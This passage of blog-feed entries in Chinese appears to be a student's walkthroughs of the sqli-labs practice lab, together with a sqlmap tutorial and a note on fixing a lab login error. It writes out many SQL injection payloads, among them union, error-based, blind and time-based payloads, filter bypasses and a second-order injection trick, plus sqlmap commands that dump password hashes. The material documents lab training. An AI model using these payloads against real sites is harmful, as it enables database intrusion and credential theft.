    <content type="html"><![CDATA[<h1>Less-23</h1><p>本关跟第一关有点像，但是试探过程中发现<code>id=1'</code>和<code>id=')</code>报错，但注释后仍报错，而<code>id=1&quot;</code>和<code>id=1&quot;)</code>回显正常，看一下源代码</p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/1.jpg" alt="1"></p><p>发现本关对–+和#都进行了转义，故不能再用这种方式注释，可以在之后构造出闭合用;%00(一种特殊的注释符)或者and和or语句进行闭合。通过试探得出该处为单引号注入：</p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/2.jpg" alt="2"></p><p>其余步骤与第一关相似，在每条语句后面加上<code>and'1'='1</code>闭合即可。</p><h1>Less-24（二次注入）</h1><p>二次注入思路：</p><ul><li>先构造语句（有被转义字符的语句或SQL语句）提交 HTTP 数据请求到服务 端进行处理</li><li>服务端保存数据，为应用程序提供原始输入数据并响应客户端请求</li><li>向服务端发送第二个与第一次不相同的请求数据信息</li><li>服务端接收到请求，查询数据库中已经存储的数据信息并处理，从而第一次请求中构造的语句在服务端环境中执行</li><li>服务端返回执行的处理结果数据信息，可以通过返回的结果判断二次注入漏洞利用是否成功</li></ul><p>页面中出现Forgot your password?点进去额…去攻击它???只能点New User click here?注册。</p><p>查看login.php源代码:</p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/15.jpg" alt="15"></p><p>登录时用户名和密码都被过滤。</p><p>查看login_create.php源代码：</p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/16.jpg" alt="16"></p><p>可插入用户名和密码</p><p>pass_change.php源代码：</p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/14.jpg" alt="14"></p><p>更改密码时，用户名没有过滤，sql语句中对用户名加了单引号。</p><p>注册用户名为admin’#密码随意：</p><img src="/2020/12/09/sqli-labs%E4%BA%94/17.jpg" alt="17" style="zoom: 50%;"><p>修改密码后使用新密码重新登录，发现无法登录，查看数据库</p><img src="/2020/12/09/sqli-labs%E4%BA%94/18.jpg" alt="18" style="zoom:80%;"><p>发现admin的密码变成了新密码，而原本注册的用户密码不变，因为在创建admin‘#之后，这个账号再次检索的时候不用进行转义检测，所以搜索到的数据库名时admin，并不是admin’#，所以修改的密码也是admin的密码，所以登录的时候，username应该是admin，而不是admin‘#。</p><h1>Less-25(绕过注入)</h1><p>正常登录后，开始测试，加上单引号，报错，注释掉回显正常，故为单引号注入，接下来<code>orser by 3 --+</code></p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/4.jpg" alt="4"></p><p>发现回显不正常，hint提示我们语句中的or两个字母没有了,查一下源代码：</p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/5.jpg" alt="5"></p><p>or 和and被注释掉了。</p><h2 id="法一：双写的联合查询"><a class="header-anchor" href="#法一：双写的联合查询">🍭</a>法一：双写的联合查询</h2><p>使用双写的方法，把or和and的每一个字母之间，使用or或and分隔开即可:</p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/6.jpg" alt="6"></p><p>后续和第一关一样，在遇到or和and时要双写。如下需对password进行双写<code>?id=-1' union select 1,(select group_concat(concat_ws('-',id,username,passwoorrd)) from users),3-- #</code>:</p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/7.jpg" alt="7"></p><h2 id="法二：报错注入or"><a class="header-anchor" href="#法二：报错注入or">🍭</a>法二：报错注入<code>or-&gt;||</code></h2><p><code>?id=1' || extractvalue(1,concat(0x7e,database()))--+</code></p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/8.jpg" alt="8"></p><p>发现or可以用||代替而and用&amp;&amp;代替报错。原因是&amp;&amp;进行url编码，变成了%26%26：</p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/9.jpg" alt="9"></p><h1>Less-25a</h1><p>本关可以正常union注入也可以用Bool或Time盲注，但不能报错注入：<img src="/2020/12/09/sqli-labs%E4%BA%94/10.jpg" alt="10"></p><p>源代码中将报错注释掉了。</p><p>试探一番发现为数字型输入，其余步骤与25关相似。</p><h1>Less-26</h1><p>单引号报错，将其注释后仍报错，发现注释符消失</p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/11.jpg" alt="11"></p><p>查看源代码:</p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/12.jpg" alt="12"></p><p>发现一堆符号被注释了，所以要像给or找个替代符号一样，给其他的被转义的符号找个替代：</p><ul><li><p><code>;%00</code>注释符</p></li><li><p><code>%0a</code> 新建一行</p></li><li><p><code>%0b</code> TAB 键（垂直）</p></li><li><p><code>%0c</code> 新的一页</p></li><li><p><code>%0d</code> return 功能</p></li><li><p><code>%a0</code> 空格</p></li><li><p><code>%09</code> TAB 键（水平）</p><pre><code class="hljs gcode"><span class="hljs-meta">%</span><span class="hljs-number">23</span><span class="hljs-comment">(#)</span>`、`<span class="hljs-meta">%</span><span class="hljs-number">2</span>a<span class="hljs-comment">(*)</span>`、`<span class="hljs-meta">%</span><span class="hljs-number">2</span>d<span class="hljs-comment">(-)</span>`、`<span class="hljs-meta">%</span><span class="hljs-number">2</span>f<span class="hljs-comment">(/)</span>`、`<span class="hljs-meta">%</span><span class="hljs-number">5</span>c<span class="hljs-comment">(\)</span></code></pre></li></ul><p>有三种注入方式：</p><ul><li><p>因正确回显非固定字符串，可利用以上特殊 URL 编码代替空格，仍使用<code>union</code>加空格连接<code>select</code>联合注入。</p><p>将单引号注释掉:<code>?id=0%27%a0||%a0%271%27=%271</code></p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/20.jpg" alt="20"></p><p>回显正常，故为单引号注入</p><p><code>?id=0'%a0union%a0select%a02,database(),4%a0||%a0'1'='1</code></p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/19.jpg" alt="19"></p><p>接下去和之前类似，注意字符转换。</p></li><li><p>updatexml()与extractvalue()报错注入</p><p><code>?id=0'||updatexml(1,concat('$',(database())),0)||'1'='1</code></p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/21.jpg" alt="21"></p><p>接下去同理。</p></li><li><p>Bool 盲注，构造注入语句避开空格。</p></li></ul><h1>Less-26a</h1><p><code>?id=1'</code>无回显，双引号回显正常查看源代码：</p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/22.jpg" alt="22"></p><p>图中48行将报错注释掉，故此关不能使用报错注入，or,and等符号一样被注释掉了。将单引号注释掉仍无回显，用<code>?id=1')||'1'=('1</code>进行注释回显正常故为‘）闭合型注入。</p><p><img src="/2020/12/09/sqli-labs%E4%BA%94/23.jpg" alt="23"></p><p>其余步骤与26关类似<strong>但不可用报错注入</strong>。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>less-24登录报错解决方法</title>
    <link href="/2020/12/06/24/"/>
    <url>/2020/12/06/24/</url>
    
    <content type="html"><![CDATA[<p>十二月一号的时候打靶场打到第24关，按正常步骤先进行注册后页面如下：</p><p><img src="/2020/12/06/24/2.jpg" alt="2"></p><p>无法跳转到初始登录页面，且出现警告，然后我以为这只是正常警告就手动点击home键返回</p><p>用刚注册的账号登录出现如下页面:</p><p><img src="/2020/12/06/24/1.jpg" alt="1"></p><p>无法正常登录，然后我根据警告内容查看了login.php文件，查不出什么错误。之后就去百度，搜到两种解法，第一种是logged-in文件有错误，我重新下了sqli-labs的压缩包替换，结果一样…第二种是修改php.ini文件里的output_buffering = Off，将Off改为On；将session.auto_start = 0 改为session.auto_start = 1 。改完后需要重启apache，我按照这个方法改了如下文件里的配置</p><p><img src="/2020/12/06/24/3.jpg" alt="3"></p><p>发现还是不行，依旧是那个页面，然后我就卡在24关到今天，卡了快一周…</p><p>就在今天，我发现了另一个文件:</p><p><img src="/2020/12/06/24/4.jpg" alt="4"></p><p>这个文件的类型为设置配置！！！我改了这个文件的相关参数，再次登录发现成功登录了!!</p><p><img src="/2020/12/06/24/17.jpg" alt="17"></p><p>所以只需在此文件里改信息…因为登录问题卡了快一周的东西就这么解决了。。</p><p>至于为什么这么做查到的解释是：用txt文件编辑过function.php、wp-login.php、pluggable.php 这三个PHP文件导致UTF8编码和BOM冲突，UTF8文件的BOM（Byte Order Mark)标志，在保存的时候会自动存入！</p><p>然后问题就解决了~~</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sqlmap</title>
    <link href="/2020/12/01/sqlmap/"/>
    <url>/2020/12/01/sqlmap/</url>
    
    <content type="html"><![CDATA[<h4 id="前言"><a class="header-anchor" href="#前言">🍭</a>前言</h4><p>sqlmap终于终于搭好了，之前的python环境没搭好，下了好多次换过2.X和3.X，设置环境变量的时候还不小心将path变量删了导致博客崩了…之后sqlmap解压错根目录了…终于把sqlmap搭好了想打靶场，发现还需要有抓包工具，于是又去搭java环境,下Burp Suite。现在终于可以了!!!</p><h1>Sqlmap简介</h1><p>五种注入模式：布尔盲注，时间盲注，报错注入，联合查询，堆查询</p><p>支持的数据库：MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB</p><p>七种等级:</p><ul><li>0 只显示python错误以及严重的信息。</li><li>1 同时显示基本信息和警告信息。（默认）</li><li>2 同时显示debug信息。</li><li>3 同时显示洼入的payload</li><li>4 同时显示HTTP请求</li><li>5 同时显示HTTP响应头</li><li>6 同时显示HTTP响应页面。</li></ul><p>常用命令：</p><pre><code class="hljs awk">-a, --all<span class="hljs-regexp">//</span>获取所有信息-b, --banner<span class="hljs-regexp">//</span>获取数据库管理系统的标识--current-user<span class="hljs-regexp">//</span>获取数据库管理系统当前用户--current-db<span class="hljs-regexp">//</span>获取数据库管理系统当前数据库--hostname<span class="hljs-regexp">//</span>获取数据库服务器的主机名称--is-dba<span class="hljs-regexp">//</span>检测DBMS当前用户是否DBA--users<span class="hljs-regexp">//</span>枚举数据库管理系统用户--passwords<span class="hljs-regexp">//</span>枚举数据库管理系统用户密码哈希--privileges<span class="hljs-regexp">//</span>枚举数据库管理系统用户的权限--roles<span class="hljs-regexp">//</span>枚举数据库管理系统用户的角色--dbs<span class="hljs-regexp">//</span>枚举数据库管理系统数据库--tables<span class="hljs-regexp">//</span>枚举的DBMS数据库中的表--columns<span class="hljs-regexp">//</span>枚举DBMS数据库表列--schema<span class="hljs-regexp">//</span>枚举数据库架构--count<span class="hljs-regexp">//</span>检索表的项目数，获取表中的数据个数:sqlmap.py -u url --count -D testdb--dump<span class="hljs-regexp">//</span>转储数据库表项--dump-all<span class="hljs-regexp">//</span>转储数据库所有表项--search<span class="hljs-regexp">//</span>搜索列（S），表（S）和/或数据库名称（S）--comments<span class="hljs-regexp">//</span>获取DBMS注释-D DB<span class="hljs-regexp">//</span>要进行枚举的指定数据库名-T TBL<span class="hljs-regexp">//</span>DBMS数据库表枚举-C COL<span class="hljs-regexp">//</span>DBMS数据库表列枚举-X EXCLUDECOL<span class="hljs-regexp">//</span>DBMS数据库表不进行枚举-U USER<span class="hljs-regexp">//</span>用来进行枚举的数据库用户--exclude-sysdbs<span class="hljs-regexp">//</span>枚举表时排除系统数据库--start=LIMITSTART<span class="hljs-regexp">//</span>获取第一个查询输出数据位置--stop=LIMITSTOP<span class="hljs-regexp">//</span>获取最后查询的输出数据--first=FIRSTCHAR<span class="hljs-regexp">//</span>第一个查询输出字的字符获取--last=LASTCHAR<span class="hljs-regexp">//</span>最后查询的输出字字符获取--sql-query=QUERY<span class="hljs-regexp">//</span>要执行的SQL语句--sql-shell<span class="hljs-regexp">//</span>提示交互式SQL的shell--sql-file=SQLFILE<span class="hljs-regexp">//</span>要执行的SQL文件</code></pre><p>技术分类：</p><pre><code class="hljs excel">–technique：B：布尔盲注E：报错U：联合S：堆叠<span class="hljs-built_in">T</span>：时间Q：内联查询</code></pre><h1>GET型</h1><h4 id="1-先测试是否存在注入"><a class="header-anchor" href="#1-先测试是否存在注入">🍭</a>1.先测试是否存在注入</h4><pre><code class="hljs vim"><span class="hljs-keyword">python</span> sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> <span class="hljs-string">&quot;http://localhost/Less-1/?id=1&quot;</span></code></pre><p><img src="/2020/12/01/sqlmap/1.jpg" alt="1"></p><p>红框框中语句表明存在注入，有时候也可能不存在SQL注入。逐个测试会挺麻烦的可以批量检测，将目标url整理为txt文件，当文件保存为hhh.txt时使用“sqlmap.py-m hhh.txt”，注意<strong>hhh.txt跟sqlmap在同一个目录下</strong></p><h4 id="2-查库"><a class="header-anchor" href="#2-查库">🍭</a>2.查库</h4><pre><code class="hljs jboss-cli">python sqlmap.py -u <span class="hljs-string">&quot;http://localhost/Less-1/?id=1&quot;</span> <span class="hljs-params">--dbs</span> <span class="hljs-params">--batch</span></code></pre><p>or</p><pre><code class="hljs awk">sqlmap -u [“url”] --current-db<span class="hljs-regexp">//</span>列出当前数据库</code></pre><p><code>dbs</code>表示列出说有数据库，batch可以自动选择，也可以省略，但省略后就需要手动选择<img src="/2020/12/01/sqlmap/2.jpg" alt="2"></p><h4 id="3-查表"><a class="header-anchor" href="#3-查表">🍭</a>3.查表</h4><pre><code class="hljs brainfuck"><span class="hljs-comment">sqlmap</span> <span class="hljs-literal">-</span><span class="hljs-comment">u</span> <span class="hljs-title">[</span><span class="hljs-comment">“url”</span><span class="hljs-title">]</span> <span class="hljs-literal">-</span><span class="hljs-comment">D</span> <span class="hljs-title">[</span><span class="hljs-comment">‘数据库名’</span><span class="hljs-title">]</span> --<span class="hljs-comment">tables</span> --<span class="hljs-comment">batch</span></code></pre><p><img src="/2020/12/01/sqlmap/3.jpg" alt="3"></p><h4 id="4-查列"><a class="header-anchor" href="#4-查列">🍭</a>4.查列</h4><pre><code class="hljs scss">sqlmap -u <span class="hljs-selector-attr">[“url”]</span> -D <span class="hljs-selector-attr">[‘数据库名’]</span> -T<span class="hljs-selector-attr">[‘表名’]</span> --<span class="hljs-attribute">columns</span> --batch</code></pre><p><img src="/2020/12/01/sqlmap/4.jpg" alt="4"></p><h4 id="5-爆值"><a class="header-anchor" href="#5-爆值">🍭</a>5.爆值</h4><pre><code class="hljs css"><span class="hljs-selector-tag">sqlmap</span> <span class="hljs-selector-tag">-u</span> <span class="hljs-selector-attr">[“url”]</span> <span class="hljs-selector-tag">-D</span> <span class="hljs-selector-attr">[‘数据库名’]</span> <span class="hljs-selector-tag">-T</span> <span class="hljs-selector-attr">[‘表名’]</span> <span class="hljs-selector-tag">-C</span> <span class="hljs-selector-attr">[‘字段名1,字段名2,…’]</span> <span class="hljs-selector-tag">--dump</span> <span class="hljs-selector-tag">--batch</span></code></pre><p><img src="/2020/12/01/sqlmap/5.jpg" alt="5"></p><p>关与关之间需要清除sqlmap缓存：</p><pre><code class="hljs c">python sqlmap.py --purge</code></pre><h1>Post型</h1><p>先用burp suite抓个包，保存到文件里</p><p><img src="/2020/12/01/sqlmap/6.jpg" alt="6"></p><p>执行命令</p><pre><code class="hljs routeros">sqlmap.py -r <span class="hljs-string">&quot;C:\Users\32270\Desktop\hhh.txt&quot;</span> <span class="hljs-attribute">--leve</span>=5 <span class="hljs-attribute">--risk</span>=3 --dbs</code></pre><p><img src="/2020/12/01/sqlmap/7.jpg" alt="7"></p><p>查表</p><pre><code class="hljs taggerscript">python sqlmap.py -r &quot;C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\3</span>2270<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\h</span>hh.txt &quot; -D security --tables --batch</code></pre><p><img src="/2020/12/01/sqlmap/8.jpg" alt="8"></p><p>接下去跟get型一样。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sqli-labs（四）</title>
    <link href="/2020/11/26/sqli-labs%E5%9B%9B/"/>
    <url>/2020/11/26/sqli-labs%E5%9B%9B/</url>
    
    <content type="html"><![CDATA[<h1>Less-18</h1><p>基于错误的用户代理，头部POST注入.</p><p>补充几个请求头：</p><blockquote><ul><li><code>Host</code><br>Host请求报头域主要用于指定被请求资源的Internet主机和端口号。</li><li><code>User-Agent</code><br>User-Agent请求报头域允许客户端将它的操作系统、浏览器和其他属性告诉服务器。</li><li><code>Referer</code><br>Referer包含一个URL，代表当前访问URL的上一个URL。</li><li><code>Cookie</code><br>Cookie是非常重要的请求头，它是一段文本，常用来表示请求者身份等。</li><li><code>Range</code><br>Range可以请求实体的部分内容。</li><li><code>X-Forwarded-For</code><br>X-Forwarded-For即XXF头，它代表请求端的IP，可以有多个，中间以逗号隔开。</li><li><code>Accept</code><br>Accept请求报头域用于指定客户端接收哪些<a href="https://www.cnblogs.com/tjudzj/p/6528008.html">MIME类型</a>的信息。</li><li><code>Accept-Charset</code><br>Accept-Charset请求报头域用于指定客户端接收的字符集。如果在请求消息中没有设置这个域，默认是任何字符集都可以接收。</li></ul></blockquote><h4 id="查找注入点"><a class="header-anchor" href="#查找注入点">🍭</a>查找注入点</h4><p>在用户名和密码注入都只回显最初的ip地址，查找源代码</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/1.jpg" alt="1"></p><p>本关对用户名和密码做了check_input()处理，故无法注入。但在用admin登录成功时发现页面有user agent 信息猜测可在其注入，但由于这里执行的语句是insert,所以不能像之前一样用#将后面的语句给注释掉。当#注释掉后面就无法正常插入执行 SQL语句。</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/2.jpg" alt="2"></p><p>查找源代码验证了猜测</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/3.jpg" alt="3"></p><p>注意:这里要输入正确的账号和密码才能绕过账号密码判断，进入处理<code>User-Agent</code>部分。<strong>17关对密码进行了更改,故此处记得用新密码，或者在靶场初页面重置，否则无法登录</strong>，本人用admin登录了半天登不进去，后来才反应过来17关改密码了…</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/4.jpg" alt="4"></p><h3 id="（一）hackbar插件"><a class="header-anchor" href="#（一）hackbar插件">🍭</a>（一）hackbar插件:</h3><h3 id="extractvalue（）"><a class="header-anchor" href="#extractvalue（）">🍭</a>extractvalue（）</h3><h4 id="1-试探"><a class="header-anchor" href="#1-试探">🍭</a>1.试探</h4><p>先试单引号</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/7.jpg" alt="7"></p><p>报错，再闭合，回显正常</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/6.jpg" alt="6"></p><p>查看源代码确定为单引号注入。</p><h4 id="2-爆库"><a class="header-anchor" href="#2-爆库">🍭</a>2.爆库</h4><p><code>' or extractvalue(1,concat(0x7e,(select database()),0x7e)) or '1'='1</code></p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/5.jpg" alt="5"></p><h4 id="3-爆表"><a class="header-anchor" href="#3-爆表">🍭</a>3.爆表</h4><p><code>' or extractvalue(1,concat(0x7e,(select group_concat(table_name) from  information_schema.tables and table_schema=database()))) or '1'='1</code><img src="/2020/11/26/sqli-labs%E5%9B%9B/8.jpg" alt="8"></p><h4 id="4-爆列"><a class="header-anchor" href="#4-爆列">🍭</a>4.爆列</h4><p><code>' or extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema='security')))  or '1'='1</code></p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/9.jpg" alt="9"></p><h4 id="5-爆值"><a class="header-anchor" href="#5-爆值">🍭</a>5.爆值</h4><p><code>' or extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users)))  or'1'='1 </code><img src="/2020/11/26/sqli-labs%E5%9B%9B/10.jpg" alt="10"></p><p>遇到之前的老问题数据显示不全，可用limit0,1;来遍历或者使用not in()：</p><p><code>' or extractvalue(1,concat(0x7e,(select  group_concat(username,0x3a,password) from users where username not in  ('Dumb','Angelinal')))) or ' </code></p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/11.jpg" alt="11"></p><p>不过这种方法也很麻烦。</p><p>updatexml()类似。</p><h3 id="floor"><a class="header-anchor" href="#floor">🍭</a>floor():</h3><p><code>' and (select 1 from (select  count(*),concat_ws('-',(select user()),floor(rand()*2))as a from  information_schema.tables group by a) b)  and '</code></p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/12.jpg" alt="12"></p><p>也可使用时间盲注。</p><h3 id="二-HTTP-Header-Live"><a class="header-anchor" href="#二-HTTP-Header-Live">🍭</a>(二)HTTP Header Live</h3><p>HTTP Header Live是Firefox中的插件，可在其中对user-agent 进行修改。</p><h3 id="13"><a class="header-anchor" href="#13">🍭</a><img src="/2020/11/26/sqli-labs%E5%9B%9B/13.jpg" alt="13"></h3><h3 id="（三）Live-HTTP-headers"><a class="header-anchor" href="#（三）Live-HTTP-headers">🍭</a>（三）Live HTTP headers</h3><p>Live HTTP headers也是Firefox里的插件，但是需要安装低版本火狐，测试安装的是45.0版本浏览器。这篇博客有详细教程：<a href="https://blog.csdn.net/qq_22146195/article/details/103537148">火狐浏览器安装Live HTTP headers步骤记录</a></p><h3 id="四-Burp-Suite"><a class="header-anchor" href="#四-Burp-Suite">🍭</a>(四)Burp Suite</h3><p>Burp Suite 是用于攻击web 应用程序的集成平台，包含许多工具,且这些工具设计了许多接口，以加快攻击应用程序的过程。所有工具都共享一个请求，并能处理对应的HTTP 消息、持久性、认证、代理、日志、警报。<strong>安装burp suite需要java环境</strong></p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/14.jpg" alt="14"></p><p>类似工具还有很多不一一列举。</p><h1>Less-19</h1><p>基于头部的Referer POST报错注入</p><p>成功登陆后会显示referer地址,用户名与18关一样用函数进行处理，故在referer注入。与18关类似。</p><p>仍可用HTTP Header Live：</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/15.jpg" alt="15"></p><p>Burp Suite：</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/16.jpg" alt="16"></p><h1>Less-20</h1><p>基于错误的cookie头部POST注入</p><p>从源代码中我们可以看到cookie从username获得值之后，当再次刷新时会从cookie中获取username,然后进行查询。</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/18.jpg" alt="18"></p><p>因为此关为post注入，可使用union联合语句，报错语句。</p><h2 id="法一：union联合语句"><a class="header-anchor" href="#法一：union联合语句">🍭</a>法一：union联合语句</h2><h4 id="1-试探-v2"><a class="header-anchor" href="#1-试探-v2">🍭</a>1.试探</h4><p>从上图源代码中可以看出本关为单引号注入，也可以试探一下：</p><p>单引号报错</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/19.jpg" alt="19"></p><p>注释掉回显正常</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/20.jpg" alt="20"></p><h4 id="2-判断字段数与回显字段"><a class="header-anchor" href="#2-判断字段数与回显字段">🍭</a>2.判断字段数与回显字段</h4><p>使用burp suite抓个包：</p><p><code>uname=admin' order by 4 -- #</code></p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/21.jpg" alt="21"></p><p>4报错，3回显正常。其实和第一关如出一辙。</p><p><code>uname=1' union select 1,2,3 -- #</code></p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/22.jpg" alt="22"></p><p>之后就是查库，查表，查列，查值…不再赘述。</p><h2 id="法二：floor"><a class="header-anchor" href="#法二：floor">🍭</a>法二：floor()</h2><p><code>uname=1' or (select 1 from (select 1,count(*),concat_ws('-',(select database()),floor(rand()*2))as a from information_schema.tables group by a) b)-- #</code></p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/23.jpg" alt="23"></p><h2 id="法三：updatexml-注入，extractvalue-注入"><a class="header-anchor" href="#法三：updatexml-注入，extractvalue-注入">🍭</a>法三：updatexml()注入，extractvalue()注入</h2><p><code>uname=1' or updatexml(1,concat(0x7e,(select group_concat(table_name)  from information_schema.tables where table_schema=database()),0x7e),0)-- #</code></p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/24.jpg" alt="24"></p><h2 id="法四：布尔盲注"><a class="header-anchor" href="#法四：布尔盲注">🍭</a>法四：布尔盲注</h2><p><code>uname=admin' and left((select database()),8)='security'-- #</code></p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/27.jpg" alt="27"></p><p>报错时页面：</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/26.jpg" alt="26"></p><h2 id="法五：延时注入"><a class="header-anchor" href="#法五：延时注入">🍭</a>法五：延时注入</h2><p><code>uname=admin' and if(length(database())=8,1,sleep(5))-- #</code><img src="/2020/11/26/sqli-labs%E5%9B%9B/28.jpg" alt="28"></p><p>用burp suite 抓包报错会一直延时，hackbar正常延时，报错页面如下：</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/29.jpg" alt="29"></p><h1>Less-21</h1><p>基于base64编码单引号和括号的Cookie注入</p><p>本关和Less-20相似，cookie从username获得值之后，再次刷新时会从cookie中获取username,再进行查询,只是cookie的uname值需经过base64编码。</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/32.jpg" alt="32"></p><p>推荐一个编码器<a href="https://base64.us/">Base64 在线编码解码</a>，admin的编码为YWRtaW4=</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/31.jpg" alt="31"></p><p>单引号报错：</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/33.jpg" alt="33"></p><p><code>')</code>也报错，用#注释后回显正常。其余操作与20关相同，将命令编码即可。</p><h1>Less-22</h1><p>登录成功后显示的是21关的图片，应该是作者弄错了。</p><p>双引号报错</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/34.jpg" alt="34"></p><p>注释后回显正常</p><p><img src="/2020/11/26/sqli-labs%E5%9B%9B/35.jpg" alt="35"></p><p>接下去就跟21类似。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sqli-labs(三)</title>
    <link href="/2020/11/22/sqli-labs%E4%B8%89/"/>
    <url>/2020/11/22/sqli-labs%E4%B8%89/</url>
    
    <content type="html"><![CDATA[<h1>sqli-labs(三)</h1><h2 id="Less-11"><a class="header-anchor" href="#Less-11">🍭</a>Less-11</h2><p>less-11为post注入，post就是数据从客户端提交到服务器端,输入用户名和密码会以表单的形式提交到服务器进行验证。</p><h4 id="1-试探"><a class="header-anchor" href="#1-试探">🍭</a>1.试探</h4><p>用之前的1无反应，试着使用常用的管理员密码账户 admin(Dumb也行)，成功登录；加单引号注入，密码随意，报错。</p><p><img src="/2020/11/22/sqli-labs%E4%B8%89/1.jpg" alt="1"></p><p>根据报错可以判断出该处为单引号注入，使用万能密码<code>admin'or'1'='1#</code>（or ‘1’='1恒成立，所以语句恒真）将其注释；回显正常，确定为单引号注入。</p><h4 id="2-爆库名"><a class="header-anchor" href="#2-爆库名">🍭</a>2.爆库名</h4><p>用<code>union select 1,database()-- #</code>查询，语句放在用户名或密码都可以。</p><p><img src="/2020/11/22/sqli-labs%E4%B8%89/2.jpg" alt="2"></p><h4 id="3-爆表"><a class="header-anchor" href="#3-爆表">🍭</a>3.爆表</h4><p>接下来步骤与前面关卡类似</p><p><img src="/2020/11/22/sqli-labs%E4%B8%89/3.jpg" alt="3"></p><h4 id="4-爆字段4"><a class="header-anchor" href="#4-爆字段4">🍭</a>4.爆字段<img src="/2020/11/22/sqli-labs%E4%B8%89/4.jpg" alt="4"></h4><h4 id="5-爆值5"><a class="header-anchor" href="#5-爆值5">🍭</a>5.爆值<img src="/2020/11/22/sqli-labs%E4%B8%89/5.jpg" alt="5"></h4><h2 id="Less-12"><a class="header-anchor" href="#Less-12">🍭</a>Less-12</h2><p>试探出该处为双引号闭合注入，其余步骤类似。</p><h2 id="6"><a class="header-anchor" href="#6">🍭</a><img src="/2020/11/22/sqli-labs%E4%B8%89/6.jpg" alt="6"></h2><h2 id="Less-13"><a class="header-anchor" href="#Less-13">🍭</a>Less-13</h2><h4 id="1-试探7"><a class="header-anchor" href="#1-试探7">🍭</a>1.试探<img src="/2020/11/22/sqli-labs%E4%B8%89/7.jpg" alt="7"></h4><p>查询源代码可知该关卡登录成功只返回图片不返回结果；因此可采用布尔盲注或时间盲注。</p><h4 id="2-爆库名8"><a class="header-anchor" href="#2-爆库名8">🍭</a>2.爆库名<img src="/2020/11/22/sqli-labs%E4%B8%89/8.jpg" alt="8"></h4><h4 id="3-爆表9"><a class="header-anchor" href="#3-爆表9">🍭</a>3.爆表<img src="/2020/11/22/sqli-labs%E4%B8%89/9.jpg" alt="9"></h4><p>接下去与less-6提到的报错步骤相似，不再赘述。</p><h2 id="Less-14"><a class="header-anchor" href="#Less-14">🍭</a>Less-14</h2><h4 id="1-试探10"><a class="header-anchor" href="#1-试探10">🍭</a>1.试探<img src="/2020/11/22/sqli-labs%E4%B8%89/10.jpg" alt="10"></h4><p>其余与上述关卡类似。</p><h2 id="Less-15"><a class="header-anchor" href="#Less-15">🍭</a>Less-15</h2><h4 id="1-试探-v2"><a class="header-anchor" href="#1-试探-v2">🍭</a>1.试探</h4><p>本关可以使用布尔盲注或时间注入。</p><p><img src="/2020/11/22/sqli-labs%E4%B8%89/11.jpg" alt="11"></p><p><strong>注意</strong>:&amp;passwd=1不能少，因为后台源码中设置uname和passwd这两个参数任何一个都不能为空，一旦其中一个为空将不会执行SQL语句</p><p><img src="/2020/11/22/sqli-labs%E4%B8%89/15.jpg" alt="15"></p><h4 id="2-爆库名-v2"><a class="header-anchor" href="#2-爆库名-v2">🍭</a>2.爆库名</h4><p>库名：</p><p><img src="/2020/11/22/sqli-labs%E4%B8%89/16.jpg" alt="16"></p><p>之后语句皆与less-8一样。</p><h2 id="Less-1612"><a class="header-anchor" href="#Less-1612">🍭</a>Less-16<img src="/2020/11/22/sqli-labs%E4%B8%89/12.jpg" alt="12"></h2><p>其余与15关类似。</p><h2 id="Less-17"><a class="header-anchor" href="#Less-17">🍭</a>Less-17</h2><p>先看源代码</p><p><img src="/2020/11/22/sqli-labs%E4%B8%89/18.jpg" 